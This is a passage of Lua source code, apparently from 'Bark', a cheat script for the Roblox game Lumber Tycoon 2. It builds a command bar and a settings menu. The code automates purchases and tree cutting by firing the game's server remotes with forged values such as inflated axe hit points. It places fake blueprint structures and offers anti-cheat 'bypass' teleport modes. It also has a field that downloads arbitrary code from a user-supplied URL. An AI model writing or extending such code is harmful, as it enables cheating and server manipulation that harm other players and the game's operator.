				bI = bI + 1;
				if bS == 1 then
					c0 = new
				else
					table.insert(c0, new)
				end
			end
		end)
		repeat
			local c8 = {}
			for J, v in pairs(StoreItems:children()) do
				if v.Name == bw then
					table.insert(c8, v)
				end
			end;
			for J = 1, #c8 do
				local item = c8[J]
				if not _G.InfRanges and (item.PrimaryPart.CFrame.p - game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.p).Magnitude > 25 then
					_G.DogixLT2TPC(item.PrimaryPart.CFrame + Vector3.new(5, 2, 5), o)
				end;
				item:WaitForChild("Owner")
				game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(item)
				local c6 = CFrame.new(workspace.Stores[NameStore].Counter.Position + Vector3.new(0, 0.24, 0))
				local dialog = Cashier:FindFirstChild'Dialog' or {
					BuyItem = {
						BuyPrompt = {
							ConfirmPurchase = {
								ItWorked = {
									Thanks = {}
								},
								NoThanks = {
									NoThanks = {}
								}
							},
							AbortPurchase = {}
						}
					}
				}
				local c4 = false;
				local c5 = workspace.Stores[NameStore].Counter.Touched:connect(function(new)
					for J, v in pairs(item.PrimaryPart:GetTouchingParts()) do
						if v.Name == "Counter" then
							c4 = true;
							return
						end
					end
				end)
				for J = 1, 10 do
					if not c4 then
						bW:FireServer(item)
						item:SetPrimaryPartCFrame(c6)
						game:GetService'RunService'.RenderStepped:wait()
					else
						break
					end
				end;
				if c5 ~= nil then
					c5:Disconnect()
					c5 = nil
				end
			end;
			for J = 1, #c8 + 1 do
				if bI >= bS then
					break
				end;
				bU:InvokeServer({
					Character = Cashier,
					Name = Cashier.Name,
					ID = CID,
					Dialog = dialog
				}, 'Initiate')
				bU:InvokeServer({
					Character = Cashier,
					Name = Cashier.Name,
					ID = CID,
					Dialog = dialog
				}, 'ConfirmPurchase')
				bU:InvokeServer({
					Character = Cashier,
					Name = Cashier.Name,
					ID = CID,
					Dialog = dialog
				}, 'EndChat')
			end;
			wait()
		until bI >= bS;
		if c3 ~= nil then
			c3:Disconnect()
			c3 = nil
		end;
		InBuy = false;
		x("Auto-Buy", "Completed buying items. Took "..tick() - bZ.."s", .75)
		if br == nil then
			_G.DogixLT2TPC(bX, o)
		end;
		return c0
	else
		x("Auto-Buy", "Currently buying items.", 2)
	end
end;
function _G.DogixLT2Autobuy(...)
	return autobuy(...)
end;
function spawn_wire(ca, cb)
	local cc = nil;
	for J, v in pairs(game.Workspace.Properties:GetChildren()) do
		if v.Owner.Value == game.Players.LocalPlayer then
			cc = v;
			break
		end
	end;
	if not cc then
		x("Wire Spawner", "You need a plot to use this feature.", 3)
		return
	end;
	_G.DogixLT2TPC(CFrame.new(cc.OriginSquare.Position + Vector3.new(0, 5, 0)), o)
	function Spawn(cd)
		if not cd then
			return
		end;
		local ce = game.ReplicatedStorage.Purchasables:FindFirstChild(ca, true)
		local cf = {
			cc.OriginSquare.Position + Vector3.new(0, 5, 0),
			cc.OriginSquare.Position + Vector3.new(0, 10, 0)
		}
		wait(.3)
		game.ReplicatedStorage.PlaceStructure.ClientPlacedWire:FireServer(ce, cf, game.Players.LocalPlayer, cd, true)
		wait(.2)
	end;
	if cb == 1 then
		Spawn(autobuy("Wire", 1))
	else
		local cg = autobuy("Wire", cb)
		for J, v in pairs(cg) do
			Spawn(v)
		end
	end
end;
function round(ae, ch)
	local ci = 10 ^ (ch or 0)
	return math.floor(ae * ci + 0.5) / ci
end;
_G.GetTreeNC = nil;
local cj = {}
local ck = {}
function esp_part(part)
	local Z = Instance.new("BoxHandleAdornment", part)
	Z.Name = "Selection"
	Z.Adornee = Z.Parent;
	Z.AlwaysOnTop = true;
	Z.ZIndex = 0;
	Z.Size = Z.Parent.Size;
	Z.Transparency = 0;
	Z.Color = BrickColor.new(6)
end;
function esp_tree(cl)
	table.insert(ck, cl)
	for J, v in pairs(cl:GetChildren()) do
		if v.Name == "WoodSection" then
			esp_part(v)
		end
	end;
	table.insert(cj, cl.ChildAdded:connect(function(v)
		esp_part(v)
	end))
end;
function getHitPointsTbl()
	return {['Beesaxe'] = 1.4,['AxeAmber'] = 3.39,['ManyAxe'] = 10.2,['BasicHatchet'] = 0.2,['Axe1'] = 0.55,['Axe2'] = 0.93,['AxeAlphaTesters'] = 1.5,['Rukiryaxe'] = 1.68,['Axe3'] = 1.45,['AxeBetaTesters'] = 1.45,['FireAxe'] = 0.6,['SilverAxe'] = 1.6,['EndTimesAxe'] = 1.58,['AxeChicken'] = 0.9,['CandyCaneAxe'] = 0,['AxeTwitter'] = 1.65,['CandyCornAxe'] = 1.75,["CaveAxe"]=0.4}
end;
function get_fake_large_floor_points(cf)
    return {(cf * CFrame.new(3.9,0.4,-2)) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(90)), (cf * CFrame.new(3.9,0.4,2)) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(90))}
end
function get_fake_floor_point(cf)
    return cf * CFrame.new(2,0.5,0) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(90))
end
function get_fake_large_tile_points(cf)
    local points = {
        cf * CFrame.new(2,0,2),
        cf * CFrame.new(2,0,-2),
        cf * CFrame.new(-2,0,2),
        cf * CFrame.new(-2,0,-2),
    }
    local npoints = {}
    for i,v in pairs (points) do
        for i,v2 in pairs (get_fake_tile_points(v)) do
            table.insert(npoints, v2)
        end
    end
    return npoints
end
function get_fake_tile_points(cf)
    return {
        cf * CFrame.new(1,0,1),
        cf * CFrame.new(1,0,-1),
        cf * CFrame.new(-1,0,1),
        cf * CFrame.new(-1,0,-1),
    }
end
function get_fake_stair_points(cf)
    local points = {
        ["Post1"] = cf * CFrame.new(1.5,3.4,-1.9)*CFrame.Angles(math.rad(90),0,0),
        ["Post2"] = cf * CFrame.new(-0.5,1.4,-1.9)*CFrame.Angles(math.rad(90),0,0),
        ["Floor1"] = cf * CFrame.new(1,2,-1),
        ["Floor2"] = cf * CFrame.new(1,2,1),
        ["Stairs"] = cf,
    }
    return points
end
function summon_fake_large_floor(cf)
    local points = get_fake_large_floor_points(cf)
    game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer("Wall2Tall", points[1], game.Players.LocalPlayer)
    game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer("Wall2Tall", points[2], game.Players.LocalPlayer)
end
function summon_fake_small_floor(cf)
    game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer("Wall2", get_fake_floor_point(cf), game.Players.LocalPlayer)
end
function summon_fake_tile_points(cf)
    local points = get_fake_tile_points(cf)
    for i,v in pairs (points) do
        game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer("Floor2Small", v, game.Players.LocalPlayer)
    end
end
function summon_fake_large_tile_points(cf)
    local points = get_fake_large_tile_points(cf)
    for i,v in pairs (points) do
        game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer("Floor2Small", v, game.Players.LocalPlayer)
    end
end
function summon_fake_stair_points(cf)
    local pts = get_fake_stair_points(cf)
    game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer("Post", pts.Post1, game.Players.LocalPlayer)
    game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer("Post", pts.Post2, game.Players.LocalPlayer)
    game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer("Floor1Small", pts.Floor1, game.Players.LocalPlayer)
    game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer("Floor1Small", pts.Floor2, game.Players.LocalPlayer)
    game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedBlueprint:FireServer("Stair2", pts.Stairs, game.Players.LocalPlayer)
end
function legitpaint(cm, b0)
	local aH = game:GetService'Players'.LocalPlayer;
	local aB = aH.Character;
	local cn = aB.HumanoidRootPart.CFrame;
	local co = getHitPointsTbl()
	local cp = getBestAxe()
	local bX = nil;
	if b0:FindFirstChild("MainCFrame") then
		bX = b0.MainCFrame.Value
	else
		bX = b0.Main.CFrame
	end;
	if cm == nil then
		local cq = game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedStructure;
		local origowner = b0.Owner.Value
		local faking_bp = true
		print(b0.ItemName.Value)
		if b0.ItemName.Value == "Floor1Large" then
		    summon_fake_large_floor(bX)
		elseif b0.ItemName.Value == "Floor2Large" then
		    summon_fake_large_tile_points(bX)
		elseif b0.ItemName.Value == "Floor2" then
		    summon_fake_tile_points(bX)
		elseif b0.ItemName.Value == "Floor1" then
		    summon_fake_small_floor(bX)
		elseif b0.ItemName.Value:find("Stair1") then
		    summon_fake_stair_points(bX)
		else
		    faking_bp = false
		end
		if faking_bp then
		    delmodel(b0)
		    local YX = workspace.PlayerModels.ChildAdded:connect(function(v)
    			if v:WaitForChild("Owner",3) then
    				if v:FindFirstChild("BuildDependentWood") and v:FindFirstChild("Type") then
    					if v.Type.Value == "Blueprint" then
    					    if v.Owner.Value == origowner then
        						local bX = nil;
        						if v:FindFirstChild("MainCFrame") then
        							bX = v.MainCFrame.Value
        						else
        							bX = v.PrimaryPart.CFrame
        						end;
        						cq:FireServer(v.ItemName.Value, bX, game:GetService'Players'.LocalPlayer, nil, v, true)
        					end
    					end
    				end
    			end
    		end)
    		wait(1)
    		YX:Disconnect()
    		YX = nil
		    faking_bp = false
		    return
	    else
    		cq:FireServer(b0.ItemName.Value, bX, game:GetService'Players'.LocalPlayer, nil, b0, true)
	    end
		return
	end;
	if not cp then
		return
	end;
	function axe(v, w, I)
		local cr = co[cp.ToolName.Value]
		if cm == "LoneCave" and cp.ToolName.Value == "EndTimesAxe" then
			cr = 10000000
		end;
		if cm == "Volcano" and cp.ToolName.Value == "FireAxe" then
			cr = 6.35
		end;
		local table = {
			["tool"] = cp,
			["faceVector"] = Vector3.new(0, 0, -1),
			["height"] = I,
			["sectionId"] = w,
			["hitPoints"] = cr,
			["cooldown"] = 0.112,
			["cuttingClass"] = "Axe"
		}
		game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(v.CutEvent, table)
	end;
	local cs = nil;
	local ct = getBestSawmill()
	if ct == nil then
		return
	end;
	local cu = round(ct.Settings.DimZ.Value, 1)
	local cv = cu;
	local cw = 0.05;
	local cx = false;
	local cy = false;
	spawn(function()
		repeat
			if round(cu, 1) == 1 then
				break
			elseif cu > 1 and round(cu, 1) ~= 1 then
				cu = cu - 0.2;
				game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(ct["ButtonRemote_YDown"])
			elseif cu < 1 and round(cu, 1) ~= 1 then
				cu = cu + 0.2;
				game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(ct["ButtonRemote_YUp"])
			end;
			wait(cw)
		until round(cu, 1) == 1;
		cx = true
	end)
	local cz = round(ct.Settings.DimX.Value, 1)
	local cA = cz;
	spawn(function()
		repeat
			if round(cz, 1) == 1 then
				break
			elseif cz > 1 and round(cz, 1) ~= 1 then
				cz = cz - 0.2;
				game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(ct["ButtonRemote_XDown"])
			elseif cz < 1 and round(cz, 1) ~= 1 then
				cz = cz + 0.2;
				game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(ct["ButtonRemote_XUp"])
			end;
			wait(cw)
		until round(cz, 1) == 1;
		cy = true
	end)
	_G.GetTreeNC = game:GetService'RunService'.Stepped:connect(oldnocliprun)
	local cB = false;
	for bo, cC in pairs(workspace:GetChildren()) do
		if cC.Name == "TreeRegion" then
			for J, v in pairs(cC:GetChildren()) do
				if v:FindFirstChild("TreeClass") and v.TreeClass.Value == cm and v.Name == "Model" and v:FindFirstChild("Owner") then
					local by = 0;
					for cD, Y in pairs(v:children()) do
						if Y.Name == "WoodSection" then
							by = by + 1
						end
					end;
					local cE = (by > 1 or v:FindFirstChild'WoodSection'.Size.Y > 0.5) and (v.Owner.Value == nil or game.Players.LocalPlayer)
					local cF = nil;
					if cE then
						for cD, Y in pairs(v:children()) do
							if Y:IsA"BasePart" then
								if not Y:FindFirstChildOfClass("Weld") then
									if Y.ID.Value ~= 1 then
										if Y:FindFirstChild("ParentID") and not Y.ChildIDs:FindFirstChild("Child") then
											if cF == nil then
												cF = Y
											end;
											if Y.Size.Y < cF.Size.Y and math.floor(Y.Size.Y - 1 / (Y.Size.X * Y.Size.Z)) > 0.3 then
												cF = Y
											end
										end
									end
								end
							end
						end;
						cE = cF ~= nil;
						if cE then
							cE = math.floor(cF.Size.Y - 1 / (cF.Size.X * cF.Size.Z)) > 0.3
						end
					end;
					if cE then
						_G.DogixLT2TPC(cF.CFrame + Vector3.new(4, 2, 2), o)
						local cG = false;
						local cH = workspace.LogModels.ChildAdded:Connect(function(v)
							v:WaitForChild("Owner")
							if v:FindFirstChild("Owner") and v.Owner.Value == aH and v.TreeClass.Value == cm then
								cs = v;
								cG = true
							end
						end)
						local cI = math.floor(cF.Size.Y - 1 / (cF.Size.X * cF.Size.Z)) or 0.3;
						if cI < 0 then
							cI = 0
						end;
						repeat
							wait(0.05)
							if v:FindFirstChild("CutEvent") ~= nil then
								_G.DogixLT2TPC(cF.CFrame + Vector3.new(4, 2, 2), o)
								axe(v, cF.ID.Value, cI)
								wait()
							end
						until cG;
						cH:Disconnect()
						cH = nil;
						cG = false;
						cB = true;
						break
					end
				end
			end
		end;
		if cB == true then
			cB = false;
			break
		end
	end;
	_G.GetTreeNC:Disconnect()
	_G.GetTreeNC = nil;
	if not cs then
		return
	end;
	local a_ = nil;
	local cH = workspace.PlayerModels.ChildAdded:Connect(function(v)
		v:WaitForChild("Owner")
		if not v:FindFirstChild("Owner") then
			return
		end;
		if not v:WaitForChild("RecentlyCut", 0.3) then
			return
		end;
		if v.Owner.Value == aH then
			a_ = v
		end
	end)
	spawn(function()
		repeat
			wait()
		until cx and cy;
		cx = false;
		cy = false;
		for J = 1, 3 do
			game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(cs)
			cs:MoveTo(ct.Particles.CFrame.p)
			cs:FindFirstChild("WoodSection").CFrame = ct.Particles.CFrame;
			game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(cs)
			wait()
		end
	end)
	_G.DogixLT2TPC(ct.Particles.CFrame + Vector3.new(7, 2, 4), o)
	repeat
		wait()
	until a_ ~= nil;
	cH:Disconnect()
	cH = nil;
	repeat
		wait()
	until a_:WaitForChild("Reweld")
	spawn(function()
		repeat
			if cu == cv then
				break
			elseif cu > cv and round(cu, 1) ~= cv then
				cu = cu - 0.2;
				game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(ct["ButtonRemote_YDown"])
			elseif cu < cv and round(cu, 1) ~= cv then
				cu = cu + 0.2;
				game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(ct["ButtonRemote_YUp"])
			end;
			wait(cw)
		until round(cz, 1) == cv
	end)
	spawn(function()
		repeat
			if cz == cA then
				break
			elseif cz > cA and round(cz, 1) ~= cA then
				cz = cz - 0.2;
				game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(ct["ButtonRemote_XDown"])
			elseif cz < cA and round(cz, 1) ~= cA then
				cz = cz + 0.2;
				game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(ct["ButtonRemote_XUp"])
			end;
			wait(cw)
		until round(cz, 1) == cA
	end)
	spawn(function()
		_G.DogixLT2TPC(cn + Vector3.new(0, 2, 0), o)
		local temprange = game:GetService'RunService'.RenderStepped:connect(simrad)
		local C = Instance.new("BodyPosition", a_.WoodSection)
		C.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
		C.Position = bX.p;
		C.P = 800000;
		repeat
			wait()
		until a_.AncestryChanged:wait()
		temprange:Disconnect()
		temprange = nil
	end)
end;
local cJ = {}
local cK = Instance.new("ScreenGui")
_G.BarkCommandLine = cK;
local cL = Instance.new("TextBox")
local cM = Instance.new("Frame")
local cN = Instance.new("TextLabel")
local cO = Instance.new("ScrollingFrame")
local cP = Instance.new("TextButton")
cK.Name = "BarkCommandLine"
cK.Parent = game.CoreGui;
cK.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
cL.Name = "CommandBar"
cL.Parent = cK;
cL.BackgroundColor3 = Color3.new(0, 0, 0)
cL.BackgroundTransparency = 0.5;
cL.BorderColor3 = Color3.new(0, 0, 0)
cL.Position = UDim2.new(0, 0, -1, 0)
cL.Size = UDim2.new(1, 0, 0, 77)
cL.Font = Enum.Font.Gotham;
cL.Text = ""
cL.TextColor3 = Color3.new(1, 1, 1)
cL.TextScaled = true;
cL.TextSize = 10;
cL.TextWrapped = true;
cL.TextXAlignment = Enum.TextXAlignment.Left;
cM.Name = "MessageBox"
cM.Parent = cK;
cM.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
cM.Position = UDim2.new(0, 0, 2, 0)
cM.Size = UDim2.new(0, 541, 0, 100)
cN.Name = "MessageText"
cN.Parent = cM;
cN.BackgroundColor3 = Color3.new(1, 1, 1)
cN.BackgroundTransparency = 1;
cN.Size = UDim2.new(0, 541, 0, 108)
cN.Font = Enum.Font.SourceSans;
cN.Text = "Bark Message:"
cN.TextColor3 = Color3.new(1, 1, 1)
cN.TextSize = 25;
cN.TextWrapped = true;
cO.Name = "Commands"
cO.Parent = cK;
cO.Active = true;
cO.Draggable = true;
cO.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
cO.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
cO.Position = UDim2.new(0.307000011, 0, -1, 0)
cO.Size = UDim2.new(0, 392, 0, 203)
cO.ScrollBarThickness = 5;
cO.VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Left;
cP.Name = "Exit"
cP.Parent = cO;
cP.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
cP.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
cP.Position = UDim2.new(0.948448956, 0, -0.000801198184, 0)
cP.Size = UDim2.new(0, 20, 0, 20)
cP.Font = Enum.Font.SourceSans;
cP.Text = "X"
cP.TextColor3 = Color3.new(1, 1, 1)
cP.TextScaled = true;
cP.TextSize = 14;
cP.TextWrapped = true;
local cQ = cL;
local cR = cN;
local cS = cO;
local cT = cP;
local as = cM;
local cU = Instance.new("BlurEffect", workspace.CurrentCamera)
local b4 = game:GetService("UserInputService")
local cV = false;
local cW = false;
local cJ = {}
cT.MouseButton1Click:connect(function()
	Tween(cS, 0.5, {
		Position = UDim2.new(0.307, 0, -1, 0)
	})
end)
cU.Size = 0;
cU.Enabled = true;
function Tween(cX, cY, cZ)
	if cX then
		game:GetService("TweenService"):Create(cX, TweenInfo.new(cY), cZ):Play()
	end
end;
cQ.FocusLost:connect(function(F)
	MoveGUI()
	if F then
		if not parse_command(cQ.Text) then
			ShowMSG("Invalid command!", 3)
		end
	end;
	cQ.Text = ""
end)
local aF = "freezeMovement"
function MoveGUI()
	if cV then
		cV = false;
		Tween(cQ, 0.5, {
			Position = UDim2.new(0, 0, -1, 0)
		})
		for J = 6, 0, -1 do
			cU.Size = J * 4;
			wait()
		end;
		game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
		game:GetService("ContextActionService"):UnbindAction(aF)
	else
		cV = true;
		game:GetService("ContextActionService"):BindAction(aF, function()
			return Enum.ContextActionResult.Sink
		end, false, unpack(Enum.PlayerActions:GetEnumItems()))
		game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
		Tween(cQ, 0.5, {
			Position = UDim2.new(0, 0, 0, 0)
		})
		for J = 0, 25 do
			cU.Size = J;
			wait(0.00005)
		end;
		cQ:CaptureFocus()
	end
end;
function ShowMSG(msg, c_)
	if cU.Size == 25 then
		Tween(cQ, 0.5, {
			Position = UDim2.new(0, 0, 2, 0)
		})
		cR.Text = msg;
		Tween(as, 0.5, {
			Position = UDim2.new(0.025, 0, 0.975, -100)
		})
		wait(c_)
		Tween(as, 0.5, {
			Position = UDim2.new(0, 0, 1, 200)
		})
		Tween(cQ, 0.5, {
			Position = UDim2.new(0, 0)
		})
	else
		cR.Text = msg;
		Tween(as, 0.5, {
			Position = UDim2.new(0.025, 0, 0.975, -100)
		})
		wait(c_)
		Tween(as, 0.5, {
			Position = UDim2.new(0, 0, 1, 200)
		})
	end
end;
local P = Instance.new("TextLabel", cO)
P.Text = ""
P.Position = UDim2.new(0, 10, 0, 20)
P.Size = UDim2.new(1, 0, 1, 0)
P.Font = Enum.Font.SourceSansSemibold;
P.TextColor3 = Color3.fromRGB(255, 255, 255)
P.TextStrokeTransparency = 0;
P.BackgroundTransparency = 1;
P.BackgroundColor3 = Color3.new(0, 0, 0)
P.BorderSizePixel = 0;
P.BorderColor3 = Color3.new(0, 0, 0)
P.FontSize = "Size14"
P.Active = true;
P.Draggable = false;
P.TextXAlignment = Enum.TextXAlignment.Left;
P.TextYAlignment = Enum.TextYAlignment.Top;
P.ClipsDescendants = true;
function AddCmd(d0)
	P.Text = P.Text..d0 .."\n"
end;
function ClearCmd()
	P.Text = ""
end;
function HSL(d1, d2, d3, d4)
	if d1 < 0 or d1 > 360 then
		return 0, 0, 0, d4
	end;
	if d2 < 0 or d2 > 1 then
		return 0, 0, 0, d4
	end;
	if d3 < 0 or d3 > 1 then
		return 0, 0, 0, d4
	end;
	local d5 = (1 - math.abs(2 * d3 - 1)) * d2;
	local I = d1 / 60;
	local V = (1 - math.abs(I % 2 - 1)) * d5;
	local S, H, C = 0, 0, 0;
	if I < 1 then
		S, H, C = d5, V, 0
	elseif I < 2 then
		S, C, H = V, d5, 0
	elseif I < 3 then
		S, H, C = 0, d5, V
	elseif I < 4 then
		S, H, C = 0, V, d5
	elseif I < 5 then
		S, H, C = V, 0, d5
	else
		S, H, C = d5, 0, V
	end;
	local N = d3 - d5 / 2;
	return S + N, H + N, C + N, d4
end;
local d6 = s:CreateMain({
	projName = "BarkUI",
	Resizable = true,
	MinSize = UDim2.new(0, 500, 0, 369),
	MaxSize = UDim2.new(0, 769, 0, 514)
})
_G.CurrentBarkUI = d6.Screengui;
ao = d6;
local d7 = "Bark "..a;
local d8 = "Bark"
if d then
	d7 = 5182003557;
	d8 = "Ancestor"
end;
getgenv().bark_compatibility = Instance.new("Message", workspace)
getgenv().bark_compatibility.Text = "Is Bark not fully loaded? If so, your executor is most likely unsupported. We recommend using KRNL."
local d9 = d6:CreateCategory(d7)
local da = d9:CreateSection("Welcome to "..d8 .." "..a.." | https://dogix.wtf/discord")
da:Create("Toggle", "Infinite Range", function(db)
	if db then
		_G.InfRanges = game:GetService'RunService'.RenderStepped:connect(simrad)
	else
		if _G.InfRanges ~= nil then
			_G.InfRanges:Disconnect()
			_G.InfRanges = nil
		end
	end
end, {
	default = false
})
_G.ForceConfirm = true;
da:Create("Toggle", "Disable Confirmation", function(db)
	_G.ForceConfirm = not db
end, {
	default = false
})
local dc = {
	"Auto-Determine",
	"Void Bypass",
	"BodyPos Bypass",
	"Fling Bypass",
	"Jump Bypass",
	"Safe Bypass",
	"Optimized Tween"
}
if firetouchinterest then
	local dd = {}
	table.insert(dd, "Advanced Magic Bypass")
	table.insert(dd, "Basic Magic Bypass")
	for J, v in pairs(dc) do
		table.insert(dd, v)
	end;
	dc = dd;
	j = -1
end;
if b then
	table.insert(dc, "Beta Bypass")
end;
da:Create("Dropdown", "Bypass", function(db)
	_G.mode_bp = db;
	if _G.mode_bp == "Advanced Magic Bypass" then
		_G.DogixLT2Method(-1)
	elseif _G.mode_bp == "Auto-Determine" then
		_G.DogixLT2Method(0)
	elseif _G.mode_bp == "Basic Magic Bypass" then
		_G.DogixLT2Method(1)
	elseif _G.mode_bp == "BodyPos Bypass" then
		_G.DogixLT2Method(7)
	elseif _G.mode_bp == "Void Bypass" then
		_G.DogixLT2Method(8)
	elseif _G.mode_bp == "Fling Bypass" then
		_G.DogixLT2Method(2)
	elseif _G.mode_bp == "Jump Bypass" then
		_G.DogixLT2Method(3)
	elseif _G.mode_bp == "Safe Bypass" then
		_G.DogixLT2Method(6)
	elseif _G.mode_bp == "Optimized Tween" then
		_G.DogixLT2Method(4)
	elseif _G.mode_bp == "Car Bypass" then
		_G.DogixLT2Method(5)
	elseif _G.mode_bp == "Beta Bypass" and b then
		_G.DogixLT2Method(3564)
	end
end, {
	options = dc,
	default = dc[1]
})
local de = {
	"Accurate Auto-Buy (normal)",
	"Rapid Auto-Buy (may buy extras)",
	"Legacy Auto-Buy (slower)"
}
da:Create("Dropdown", "Bypass", function(db)
	if db == de[1] then
		l = 1
	elseif db == de[2] then
		l = 2
	elseif db == de[3] then
		l = 4
	end
end, {
	options = de,
	default = de[1]
})
function isnotcustom()
	return bc == "" or bc == nil
end;
da:Create("TextBox", "Custom Bypass", function(b4)
	local df = pcall(function()
		bc = game:HttpGet(b4, true)
	end)
	if not df then
		bc = nil
	end
end, {
	text = ""
})
_G.GuiToggleKey = Enum.KeyCode.RightControl;
_G.ClickTPKey = Enum.KeyCode.LeftControl;
_G.SprintKey = Enum.KeyCode.LeftShift;
local dg = Enum.KeyCode.N;
local dh = Enum.KeyCode.Q;
local di = {
	[1] = _G.GuiToggleKey,
	[2] = Enum.KeyCode.RightShift,
	[3] = _G.ClickTPKey,
	[4] = b7,
	[5] = dg,
	[6] = dh,
	[7] = _G.SprintKey
}
pcall(function()
	if readfile then
		if pcall(function()
			readfile('bark.winning.always.has.been')
		end) == true then
			local dj = readfile('bark.winning.always.has.been'):split(',')
			for J, v in pairs(dj) do
				if J ~= 4 then
					for al, dk in pairs(Enum.KeyCode:GetEnumItems()) do
						if dk.Value == tonumber(v) then
							dj[J] = dk
						end
					end
				end
			end;
			_G.GuiToggleKey = dj[1]
			_G.ClickTPKey = dj[3]
			_G.SprintKey = dj[7]
			b7 = dj[4] == "true"
			dg = dj[5]
			dh = dj[6]
			di = {
				[1] = _G.GuiToggleKey,
				[2] = dj[2],
				[3] = _G.ClickTPKey,
				[4] = b7,
				[5] = dg,
				[6] = dh,
				[7] = _G.SprintKey
			}
		end
	end
end)
da:Create("KeyBind", "Toggle GUI Visibility", function(Z)
	_G.GuiToggleKey = Z
end, {
	default = _G.GuiToggleKey
})
da:Create("KeyBind", "Internal Command Bar", function(Z)
	di[2] = Z;
	if b1 then
		cQ.Text = ""
		MoveGUI()
		cQ.Text = ""
	end
end, {
	default = di[2]
})
da:Create("Button", "Rejoin Game", function()
	game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
end, {
	animated = false
})
b1 = true;
nextparse = true;
if p ~= false then
	da:Create("Button", "Launch External Command Line", function()
		if p then
			p:printcolor("Bark "..a.." by dogix#0888", "light_blue")
		end;
		spawn(function()
			while nextparse and b1 do
				nextparse = false;
				rconsoleprint(" * ")
				parse_command(p:readline())
				nextparse = true
			end
		end)
	end, {
		animated = true
	})
end;
da:Create("Button", "Hook Chat to Command Line", function()
	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		parse_command(msg)
	end)
	x("Command Helper", "Hooked chat to command line!", 2)
end, {
	animated = true
})
if writefile then
	da:Create("Button", "Save Keybinds", function()
		if pcall(function()
			readfile("bark.winning.always.has.been")
		end) ~= false then
			delfile("bark.winning.always.has.been")
		end;
		di[1] = _G.GuiToggleKey;
		di[3] = _G.ClickTPKey;
		di[4] = b7;
		di[5] = dg;
		di[6] = dh;
		local dl = di;
		for J = 1, #dl do
			if J ~= 4 then
				dl[J] = dl[J].Value
			elseif di[J] == true then
				dl[J] = "true"
			else
				dl[J] = "false"
			end
		end;
		writefile("bark.winning.always.has.been", table.concat(dl, ","))
		x("Keybind Handler", "Saved keybinds!", 2)
	end, {
		animated = true
	})
end;
local dm = d9:CreateSection("Theming")
local dn = {
	Background = Color3.fromRGB(46, 46, 54),
	GrayContrast = Color3.fromRGB(39, 38, 46),
	DarkContrast = Color3.fromRGB(29, 29, 35),
	TextColor = Color3.fromRGB(255, 255, 255),
	SectionContrast = Color3.fromRGB(39, 38, 46),
	DropDownListContrast = Color3.fromRGB(34, 34, 41),
	CharcoalContrast = Color3.fromRGB(21, 21, 26)
}
if readfile ~= nil then
	if pcall(function()
		readfile('bark-theme.ini')
	end) == true then
		local dp = nil;
		dp = game:GetService("HttpService"):JSONDecode(readfile('bark-theme.ini'))
		for J, v in pairs(dp) do
			if v ~= nil then
				dn[J] = Color3.fromRGB(v[1] * 255, v[2] * 255, v[3] * 255)
				s:SetThemeColor(tostring(J), dn[J])
			end
		end
	end
end;
for J, v in pairs(dn) do
	dm:Create("ColorPicker", tostring(J), function(dq)
		if dq ~= dn[J] then
			dn[J] = dq;
			s:SetThemeColor(tostring(J), dq)
		end
	end, {
		default = v
	})
end;
if writefile then
	dm:Create("Button", "Save Theme", function()
		if delfile then
			if pcall(function()
				readfile("bark-theme.ini")
			end) ~= false then
				delfile("bark-theme.ini")
			end
		end;
		local dr = {}
		for J, v in pairs(dn) do
			dr[J] = {
				v.r,
				v.g,
				v.b
			}
		end;
		writefile("bark-theme.ini", game:GetService("HttpService"):JSONEncode(dr))
		x("Theme Handler", "Saved theme to bark-theme.ini.", 2)
	end, {
		animated = true
	})
end;
getgenv().bark_compatibility:Destroy()
local ds = d9:CreateSection("Credits")
ds:Create("TextLabel", "dogix - Main Developer", {})
ds:Create("TextLabel", "FindFirstAncestor - Second Developer", {})
ds:Create("TextLabel", "xTheAlex14 - Interface Developer", {})
ds:Create("TextLabel", "Alpha - Command Bar Developer", {})
ds:Create("TextLabel", "SlaxxF - Help with functions", {})
ds:Create("TextLabel", "applebee - Help with functions", {})
ds:Create("TextLabel", "0x37 - Help with functions", {})
ds:Create("TextLabel", "Johiro - Original creator of new Mod Wood", {})
if math.random(1, 100) == 69 then
